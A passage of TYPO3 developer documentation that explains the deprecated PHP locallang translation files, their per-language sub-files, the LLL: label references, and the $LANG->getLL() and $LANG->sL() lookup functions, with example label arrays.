<CODE CLASS="western"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'sk' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'pages' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Stránka'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.0' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Štandardná'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.1' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Systémová zložka'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'title' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Titulka stránky'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;),<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'lt' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'pages' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Puslapis'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.0' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Standartinis'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.1' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Sisteminis Aplankas'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.2' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Ðiukðlinë'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'title' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Puslapio antraðtë:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'php_tree_stop' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Stapdyti puslapio medá:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'is_siteroot' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Ar svetainës ðakninis:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'storage_pid' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Bendra Puslapio Áraðo saugykla:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_users' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Administravimo pusës vartotojas'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_groups' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Administravimo pusës vartotojo grupë'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'sys_filemounts' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Bylø stendas'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;),<BR>);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">So the $LOCAL_LANG array has the syntax</P>
<PRE CLASS="western">$LOCAL_LANG[<I>language_key</I>][<I>label_key</I>] = '<I>label_value</I>';</PRE><P CLASS="western">
<BR><BR>
</P>
<H4 CLASS="western">Alternative locallang-syntax for large
translation sets</H4>
<P CLASS="western">As you can see all available languages are located
in the same file! However if a set of labels is very large it is
inefficient to load all languages into memory when you need only the
default plus the current language to be available (eg. Danish).</P>
<P CLASS="western">Therefore you can split locallang files into a
structure with a main file (locallang*.php) and sub-files
(locallang*.[langkey].php). An example is
sysext/lang/locallang_core.php:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>* Core language labels. <BR>*/<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$LOCAL_LANG </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'default' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;labels.openInNewWindow&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Open in new window&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;labels.goBack&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Go back&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;labels.makeShortcut&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Create a shortcut to this page?&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;labels.lockedRecord&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;The user '%s' began to edit this record %s ago.&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.open&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Open&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,</FONT></CODE>
<CODE CLASS="western"><FONT COLOR="#007700">... [lot of more labels here]....</FONT></CODE>
<CODE CLASS="western"><FONT COLOR="#007700"><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.save&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Save&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.unzip&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Unzip&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.info&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Info&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.createnew&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Create new&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;),<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'dk' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'de' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'no' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'it' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'fr' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'es' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'nl' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'cz' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'pl' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'si' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'fi' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'tr' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'se' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'pt' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'ru' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'ro' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'ch' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'sk' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'lt' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">The string token &quot;EXT&quot; set for all the
other languages than &quot;default&quot; tells the &quot;language&quot;
class that another file contains the language for this language key.
For the Danish language this file would be
&quot;sysext/lang/locallang_core<B>.dk</B>.php&quot;:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>* Core language labels (dk)<BR>*/<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$LOCAL_LANG</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'dk'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">] = Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;labels.openInNewWindow&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Åben i nyt vindue&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;labels.goBack&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Gå tilbage&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;labels.makeShortcut&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Opret genvej til denne side?&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.open&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Åbn&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">... [lot of more labels here]....</FONT></CODE>
<CODE CLASS="western"><FONT COLOR="#007700"><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.save&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Gem&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.unzip&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Unzip&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.info&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Info&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;cm.createnew&quot; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;Opret ny&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">A requirement is that this &quot;sub-file&quot;
sets <I>only it's own language key</I> (here &quot;dk&quot;) in the
$LOCAL_LANG array. Thus simply including this file after the main
file will add the whole &quot;dk&quot; key to the existing
$LOCAL_LANG array with no need for array merging!</P>
<P CLASS="western">Notice another detail which is a general feature
of $LOCAL_LANG arrays: The label key 'labels.lockedRecord' is <I>not</I>
specified for the Danish translation. That simply means that the
value of the &quot;default&quot; key (English) will be shown until
that value will be added by the Danish translator!</P>
<P CLASS="western"><I><B>Notice: locallang.php files are deprecated!
Use locallang-XML files instead!</B></I></P>
<H3 CLASS="western"><A NAME="2.8.10.&quot;language-splitted&quot; syntax (deprecated)|outline"></A>
&quot;language-splitted&quot; syntax (deprecated)</H3>
<P CLASS="western">An old concept called “language-split” has
been around for use with typically table-names, field names etc. in
$TCA. This concept is based on a single string with labels separated
by “|” according to the number of system languages defined in the
TYPO3_languages constant. But this approach is now depricated for the
future because it is not very scalable and it's VERY hard to maintain
properly. Therefore the “locallang” concept is required for use
anywhere a value is defined to be “language-splitted” (LS).
Instead of specifying a number of labels separated with “|” you
simply write a code, which refers to a locallang-file/label inside of
that. 
</P>
<P CLASS="western">Syntax is “LLL:[file-reference of locallang file
relative to PATH_site]:[key-name]:[extra settings]”.</P>
<P CLASS="western">File-reference should be a filename relative to
PATH_site. You can prepend the reference with “EXT:[extkey]/” in
order to refer to locallang-files from extensions.</P>
<H5 CLASS="western">Example:</H5>
<P CLASS="western">For the extension “mininews” we have a field
called “title”. Normally this would be translated into Danish
like this in the $TCA:</P>
<PRE CLASS="western">	&quot;title&quot; =&gt; Array (		
		&quot;exclude&quot; =&gt; 0,		
		&quot;label&quot; =&gt; &quot;<FONT COLOR="#ff0000">Title:</FONT>|<FONT COLOR="#008000">Titel:</FONT>&quot;,
		&quot;config&quot; =&gt; Array (
			&quot;type&quot; =&gt; &quot;input&quot;,	
			&quot;size&quot; =&gt; &quot;30&quot;,	
			&quot;eval&quot; =&gt; &quot;required&quot;,
		)
	),</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">But now we would create a file, “locallang_db.php”
in the root of the extension directory. This would look like this:</P>
<PRE CLASS="western">&lt;?php
$LOCAL_LANG = Array (
	&quot;default&quot; =&gt; Array (
		&quot;tx_mininews_news.title&quot; =&gt; &quot;<FONT COLOR="#ff0000">Title:</FONT>&quot;,
	),
	&quot;dk&quot; =&gt; Array (
		&quot;tx_mininews_news.title&quot; =&gt; &quot;<FONT COLOR="#008000">Titel:</FONT>&quot;,
	),
	&quot;de&quot; =&gt; Array (
	)
);
?&gt;</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">As you can see there is an English (red) and
Danish (green) translation. But the German is still missing. 
</P>
<P CLASS="western">Now, in the $TCA array we change the
“language-splitted” label to this value instead:</P>
<PRE CLASS="western">	&quot;title&quot; =&gt; Array (		
		&quot;exclude&quot; =&gt; 0,		
		&quot;label&quot; =&gt; &quot;<FONT COLOR="#ff0000"><B>LLL:</B></FONT><FONT COLOR="#800080"><B>EXT:mininews/locallang_db.php</B></FONT><B>:</B><FONT COLOR="#008080"><B>tx_mininews_news.title</B></FONT>&quot;,
		&quot;config&quot; =&gt; Array (
			&quot;type&quot; =&gt; &quot;input&quot;,	
			&quot;size&quot; =&gt; &quot;30&quot;,	
			&quot;eval&quot; =&gt; &quot;required&quot;,
		)
	),
</PRE><P CLASS="western">
As you can see it has now become a reference to the file
“locallang_db.php” in the &quot;mininews&quot; extension. Inside
this file we will pick the label “tx_mininews_news.title” (this
associative key could be anything you decide. In this case I have
just been systematic in my naming).</P>
<P CLASS="western">Notice how the reference to the locallang file is
divided into three parts separated with a colon, marked with colors
corresponding with the syntax mentioned before: “<FONT COLOR="#ff0000">LLL:</FONT><FONT COLOR="#800080">[file-reference
of locallang file]</FONT>:<FONT COLOR="#008080">[key-name]</FONT>:<FONT COLOR="#0000ff">[extra
settings]</FONT>”.</P>
<P CLASS="western">The “extra-settings” are currently not used.</P>
<H3 CLASS="western"><A NAME="2.8.11.How to acquire labels from the $LANG object|outline"></A>
How to acquire labels from the $LANG object</H3>
<P CLASS="western">The previous section described the storage
structure for translations: &quot;locallang&quot; files and
$LOCAL_LANG arrays. But how are these values practically used?</P>
<P CLASS="western">Basically there are two approaches:</P>
<UL>
	<LI><P CLASS="western">Call $LANG-&gt;getLL(&quot;<I>label_key</I>&quot;)</P>
	<LI><P CLASS="western">Call $LANG-&gt;sL(&quot;LLL:[file-reference
	of locallang file]:[key-name]&quot;)</P>
</UL>
<P CLASS="western">These are described below.</P>
<H4 CLASS="western">$LANG-&gt;getLL()</H4>
<P CLASS="western">This approach will simply return a label from the
globally defined $LOCAL_LANG array. So prior to calling this function
you must have included a locallang file (and possibly sub-file) in
the global scope of the script.</P>
<P CLASS="western">There is a sister function,
$LANG-&gt;getLLL(&quot;<I>label_key</I>&quot;, $LOCAL_LANG), which
allows you to do the same thing, but pass along the $LOCAL_LANG array
to use (instead of the global array).</P>
<P CLASS="western">Requires a locallang file to be manually included
prior to use. See below.</P>
<H4 CLASS="western">$LANG-&gt;sL()</H4>
<P CLASS="western">This approach lets you get a label by a reference
to the file where it exists and its label key:
$LANG-&gt;sL(&quot;LLL:[file-reference of locallang
file]:[key-name]&quot;). That mode is initiated by a triple L (LLL:)
prefix of the string. 
</P>
<P CLASS="western">The file-reference is a &quot;locallang&quot;-file
in either PHP or XML format. It is not important to know in this
case! Using the &quot;.php&quot; or &quot;.xml&quot; file ending will
